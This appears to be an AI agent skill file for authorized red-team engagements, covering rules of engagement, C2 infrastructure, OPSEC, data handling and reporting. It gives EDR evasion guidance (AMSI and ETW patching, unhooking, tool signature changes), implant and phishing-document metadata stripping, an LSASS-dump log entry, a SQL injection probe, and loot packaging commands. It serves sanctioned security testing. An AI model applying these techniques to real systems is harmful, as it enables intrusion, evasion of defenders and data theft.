---
name: red-team
description: >
  Authorized red-team and adversary-emulation operations: 77 tactics across web and API,
  Windows and Active Directory, exploit development, cloud and supply chain, network,
  wireless/RF/hardware, OSINT, AI security, and reporting. Use for engagement planning,
  rules of engagement, deconfliction, infrastructure, initial access, exploitation,
  privilege escalation, lateral movement, C2, OPSEC, evasion, data handling, evidence,
  the final report, and the purple-team debrief. Requires signed authorization.
metadata:
  curated_from: 77
  groups: 9
  tactics: 77
---

# red-team

77 tactics. 9 groups. One hub. Every source body preserved verbatim in
`references/tactics/<tactic>.md`. Load one tactic at a time for the current phase or
surface.

## Authorization floor

1. **Signed authorization is mandatory.** The rules of engagement are a legal document, not a formality. No signature, no testing.
2. **The ROE must contain:** authorization window with exact dates and hours; authorized techniques and permitted ATT&CK tactics; notification thresholds; a 24/7 emergency phone for deconfliction; a legal shield referencing the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), or local equivalent.
3. **Record what is out of scope:** production systems that cannot tolerate downtime, third-party SaaS without authorization, destructive actions, and social engineering of named individuals such as executives and legal counsel.
4. **Authorization is not permission to cause harm.** Minimum necessary action. Reversible over irreversible. No destructive action, no denial of service, and no real-user harm unless the ROE explicitly authorizes it.
5. **Stop and notify** when you discover an active threat actor in the environment, child exploitation material, or accidental data destruction. These are notification thresholds, not judgment calls.
6. **Kill dates on every beacon.** A forgotten callback months after the engagement is legal liability.
7. **Third-party assets are out of scope.** An asset belongs to the target only with a concrete ownership signal: owned domain, org tenant, publisher account, or org repository. A name match is not proof.
8. **Scope expired or revoked: stop.** Do not resume without new written authorization.

```text
# Deconfliction log entry
2026-08-25T14:32:00Z | OPERATOR: kai | ACTION: lateral-movement
  TARGET: 10.10.5.22 (WORKSTATION-FIN03)
  TECHNIQUE: T1021.006 (Windows Remote Management)
  TOOL: evil-winrm via SOCKS proxy
  NOTES: creds from LSASS dump on WORKSTATION-FIN01
  DECONF-CODE: REDTIGER-4482
```

Deconfliction models: trusted agent (one or two defenders who know and can confirm or deny
activity on a secure channel), code word embedded in tooling or traffic, and a timestamped
log shared near-real-time. All operator communications use end-to-end encrypted channels.
Never discuss target details over plain email or Slack.

## Engagement objectives

Pick one or more, in writing:

- **Data exfiltration** — retrieve specific records from a database.
- **Domain dominance** — obtain Domain Admin or equivalent.
- **Business process disruption** — demonstrate ability to halt a critical workflow.
- **Physical access** — gain entry to a restricted area.

Scenarios: assumed breach (start with a standard-user foothold, test post-exploitation),
external to internal (full chain from the internet), insider threat (legitimate credentials,
data loss and sabotage), physical and cyber hybrid (tailgating, badge cloning, drop box).

## Lifecycle

| Phase | Key actions | ATT&CK |
| --- | --- | --- |
| Planning | Scope, ROE, deconfliction, legal authorization | — |
| Infrastructure | Domain aging, VPS, redirectors, TLS | TA0042 |
| Initial access | Phishing, exploitation, physical | TA0001 |
| Execution | Loader -> minimal implant -> full C2 | TA0002 |
| Persistence | Registry, scheduled tasks, DLL hijack | TA0003 |
| Privilege escalation | Token manipulation, UAC bypass, kerberoast | TA0004 |
| Defense evasion | AMSI bypass, ETW patch, unhook, LOLBins | TA0005 |
| Credential access | LSASS dump, kerberoast, DCSync | TA0006 |
| Discovery | AD enumeration, network scanning | TA0007 |
| Lateral movement | WinRM, SMB, DCOM, RDP hijack | TA0008 |
| Collection | Stage sensitive data, encrypt | TA0009 |
| Exfiltration | DNS tunnel, HTTPS chunked, cloud storage | TA0010 |
| C2 | Malleable profiles, sleep/jitter, fallbacks | TA0011 |
| Cleanup | Remove artifacts, verify, document | — |
| Reporting | Narrative, findings, ATT&CK map, debrief | — |

## OPSEC non-negotiables

```text
  - Team server binds to 127.0.0.1 only; all external access via redirector/tunnel
  - Kill dates on every beacon; no exceptions
  - Zero-sleep only during active hands-on-keyboard; 60s+ otherwise
  - Encrypt all collected data immediately; never store plaintext credentials
  - Separate infrastructure per tier; burning T1 must not expose T3
  - Strip metadata from all delivered files
  - Log every action with timestamp, target, technique, and deconfliction code
  - Never reuse infrastructure, domains, or tooling across engagements
```

Infrastructure: three tiers — T1 delivery (burn expected), T2 short-haul C2 (interactive),
T3 long-haul C2 (protect). Separate domains, VPS providers, and operator accounts per tier.
Register domains 14-30 days before the engagement; categorize as Business or Technology,
never Uncategorized. Never expose the team server directly; filter at the redirector by URI
and User-Agent. TLS from Let's Encrypt or a commercial CA; never self-signed.

C2 profile checklist:

```text
  [ ] host_stage = false (disable staging)
  [ ] sleep/jitter configured per beacon tier
  [ ] User-Agent matches target's legitimate traffic
  [ ] URIs mimic real application endpoints
  [ ] Memory obfuscation enabled (sleep_mask, obfuscate)
  [ ] Valid TLS certificate in keystore
  [ ] Spawn-to process set to legitimate binary (not rundll32)
  [ ] Named pipes randomized (not default CS pattern)
```

Beacon timing: interactive 5-10s sleep / 30-50% jitter; idle 60-300s / 30-50%;
long-haul 12-24h / 50%; exfiltration 30-60s / 20%. Fallback chain: HTTPS via CDN →
DNS-over-HTTPS → DNS TXT → ICMP/raw TCP as last resort. Failed channels back off
exponentially, then dormant retry; never noisy failed connections.

Attribution: dedicated VPN or Tor for engagement activity, engagement-specific pseudonyms
and disposable email, no reuse across engagements. Strip metadata:

```bash
exiftool -all= phishing_doc.docx
exiftool phishing_doc.docx | grep -iE "author|creator|company|producer"
strip --strip-all implant
objcopy --remove-section=.note.gnu.build-id implant
```

Modify tool signatures. Cobalt Strike: never the default profile; change named pipes,
watermark, injection technique. Mimikatz: build from source or use `nanodump`, `PPLdump`,
or `comsvcs.dll`. Impacket: change default service names, pipe names, and banners.

Maintain a running indicator list: files dropped, registry keys, services, scheduled tasks,
accounts created. Remove every artifact at engagement end or give the client the complete
list. Clear event logs only when the ROE explicitly authorizes it.

## Data handling

- Encrypt collected data immediately. Never store plaintext credentials, PII, or sensitive business data unencrypted.
- Stage before exfiltration: copy to a staging directory, compress, encrypt, transfer. Never exfiltrate directly from the source.
- Chain of custody: SHA-256 hash every file at collection, log who accessed what and when, store on encrypted access-controlled media, destroy client data after the agreed retention period (typically 30-90 days post-report).

```bash
tar czf - loot/ | gpg --symmetric --cipher-algo AES256 \
  --batch --passphrase-file /path/to/engagement.key > loot.tar.gz.gpg
scp loot.tar.gz.gpg operator@evidence.internal:/engagements/2026-CLIENT/
sha256sum loot.tar.gz.gpg > loot.tar.gz.gpg.sha256
```

## Group routing

| Group | Tactics |
| --- | --- |
| **Web & API** | `xss` `ssrf` `ssti` `xxe` `idor` `file-upload` `deserialization` `request-smuggling` `race-condition` `toctou` `parameter-pollution` `open-redirect` `jwt` `oauth` `graphql` `api-abuse` `api-security` `business-logic` `waf-bypass` `crypto-attacks` `vuln-classes` `fast-checking` |
| **Windows & Active Directory** | `windows-privesc` `windows-mitigations` `windows-boundaries` `active-directory` `lateral-movement` `persistence` `anti-forensics` `netexec` `edr-evasion` `shellcode` `keylogger-arch` |
| **Exploit dev & research** | `linux-privesc` `basic-exploitation` `crash-analysis` `exploit-development` `exploit-dev-course` `mitigations` `fuzzing` `fuzzing-course` `bug-identification` |
| **Cloud & supply chain** | `cloud` `k8s-attacks` `container-escape` `cicd-pipeline` `cicd-secrets` `dependency-confusion` `supply-chain` |
| **Network & operations** | `network-attacks` `tls-attacks` `data-exfiltration` `c2-frameworks` `initial-access` `advanced-redteam` |
| **Wireless / RF / hardware** | `wifi` `wifi-recon` `wpa2-psk` `wpa3-sae` `wpa-enterprise` `wps` `evil-twin` `deauth-disassoc` `krack-fragattacks` `bluetooth-ble` `bluetooth-classic` `zigbee-thread-matter` `z-wave` `lorawan-sub-ghz` `iot` |
| **OSINT / social / mobile** | `osint` `osint-methodology` `social-engineering` `phishing` `mobile` |
| **AI security** | `ai-security` |
| **Reporting** | `reporting` |

Full table with descriptions: `references/tactics.tsv` (`tactic, group, description, file, source`).
Grouped links: `references/INDEX.md`.

Route by surface and phase:

- Web or API endpoint → Web & API. Start with `vuln-classes` and `fast-checking`, then the specific class.
- Windows host, domain, or credential material → Windows & Active Directory.
- Binary, firmware, crash, or fuzz target → Exploit dev & research.
- Cloud account, cluster, pipeline, or dependency → Cloud & supply chain.
- Network protocol, C2 design, or engagement start → Network & operations.
- Radio, Wi-Fi, BLE, Zigbee, Z-Wave, LoRaWAN, or IoT → Wireless / RF / hardware.
- Person, domain, organization, or breach corpus → OSINT / social / mobile.
- Model, prompt, agent, or RAG surface → AI security.
- Findings ready to write → Reporting.

## Evasion baseline

- AMSI inspects PowerShell, VBScript, JScript, and .NET assembly loads. Bypass before suspicious commands in those contexts. Patch `AmsiScanBuffer` to return clean or set `amsiInitFailed`.
- ETW feeds EDR telemetry. Patching `EtwEventWrite` in `ntdll.dll` to `0xC3` (`ret`) neutralizes that channel.
- Unhooking and direct syscalls avoid user-mode hooks. Prefer direct or indirect syscalls from a clean ntdll copy over in-memory patching where the EDR watches for it.
- LOLBins blend execution into legitimate binaries. Prefer signed system binaries over dropped tooling.

## Evidence and reporting

Capture for every finding and every action:

1. UTC timestamp, ISO 8601.
2. Source IP, including any pivot.
3. Target host, URL, or RPC interface.
4. Action sent.
5. Result received.
6. Hash of any extracted data.

```csv
timestamp,operator,src_ip,target,action,result_hash,notes
2025-04-12T14:33:07Z,KA,10.10.10.5,app.client.com,SQLi probe ' OR 1=1--,sha256:abc...,initial detection
```

Redaction before any artifact leaves the secure environment:

- Replace credentials with placeholders: `<REDACTED-PASSWORD>`, `<TOKEN-A1>`.
- Hash extracted PII. Never include real names, emails, or SSNs in screenshots.
- Crop screenshots to the relevant area. Check browser tabs and URLs for session tokens.
- Strip EXIF: `exiftool -all= *.png`.
- Remove debug toolbars that reveal client infrastructure paths.

Report structure:

1. Executive summary, 1-2 pages, business impact, non-technical.
2. Engagement overview: scope, objectives, timeline, methodology, limitations.
3. Attack narrative: chronological chain from initial access to objective, timestamps and screenshots.
4. Technical findings: description, affected systems, MITRE ATT&CK mapping, evidence, risk rating, remediation.
5. MITRE ATT&CK heat map: techniques used, where detection succeeded and failed.
6. Remediation roadmap: prioritized by effort and impact.
7. Indicator appendix: every IOC introduced — IPs, domains, file hashes, accounts, registry keys.

One finding per file or section. Executive summary last to write, first to read. Each finding:
summary, background, description, reproduction steps, evidence, impact, remediation
(fix the bug → defense in depth → detection), references, retest notes. Chains get their own
narrative because the combination often warrants higher severity than any single finding.

Severity: CVSS v3.1 as the floor, then sanity-check against business impact. Justify every
metric in one sentence. If two reasonable people would score differently, document why.
CVSS v4.0 only when the client mandates it. Never over-CVSS. A "Medium" XSS in an
authenticated PII panel can outrank an unauthenticated "High" on a metadata-less internal
service; add a Business Impact Adjustment rather than lie with the score.

Common mistakes: CVSS 9.0 on everything, marketing language, raw tool output as evidence,
generic remediation, missing reproduction steps, untimed evidence, ungrouped identical
findings, no retest plan, conflating scope with limitations, informational findings used as
filler.

Deliverables: Markdown is the single source of truth. Generate PDF, DOCX, HTML, JSON, and
CSV from it. Never maintain parallel formats by hand.

Purple-team debrief within one week of report delivery. Walk the chain with red and blue
present. At each step: did blue detect it, how fast, and if not why not. Map gaps to
logging, alerting, or tooling. Write detection rules for techniques that evaded monitoring.
Replay techniques in a controlled setting so defenders can tune.

## Severity anchors

- **Critical:** domain dominance, remote code execution, mass data exfiltration, full authentication bypass.
- **High:** privilege escalation, lateral movement to tier-0, targeted sensitive data access, detection evasion across the estate.
- **Medium:** limited access or disclosure requiring conditions the attacker can meet.
- **Low:** information disclosure or hygiene issue with no direct path.
- The ROE, client risk model, and demonstrated impact outrank the class.

## Output contract

```
phase=<planning|recon|access|exec|persist|privesc|evade|cred|lateral|collect|exfil|c2|cleanup|report>
tactic=<tactic>  target=<host|domain|url|person|device>
technique=<Txxxx[.xxx]>  deconf=<code>  status=<ok|blocked|detected|killed>
action=<what was done>  result=<what was observed>  evidence=<artifact|hash>
next=<tactic|phase|report|stop>
```

One block per action that changes state. One line per finding. No narrative. Log every
action to the deconfliction log before the next.

## Failure handling

| Symptom | Action |
| --- | --- |
| No ownership proof | Out of scope. Do not test. |
| Active threat actor present | Stop. Notify per ROE. |
| Unintended data destruction | Stop. Notify. Preserve evidence. |
| Target unstable under testing | Pause. Confirm with trusted agent. |
| Beacon lost | Use fallback channel; do not re-phish unless authorized. |
| EDR alerts on tooling | Change tooling or technique. Do not brute-force the sensor. |
| Scope or window expired | Stop. No resumption without new authorization. |
| Credentials or PII in plaintext | Encrypt now. Rotate if exposed. |
| Detection observed | Log it. It is a debrief finding, not a failure. |
| Objective met | Clean up artifacts, document IOCs, move to reporting. |

## Provenance

- `SOURCES.md` — all 77 sources, skill name, tactic, group, reference.
- `references/tactics/` — 77 bodies verbatim, source path and original skill name in HTML comments.
- `references/INDEX.md` — 9 groups with purpose lines.
- `references/tactics.tsv` — 77 rows.
- No non-`SKILL.md` assets existed in this cluster.
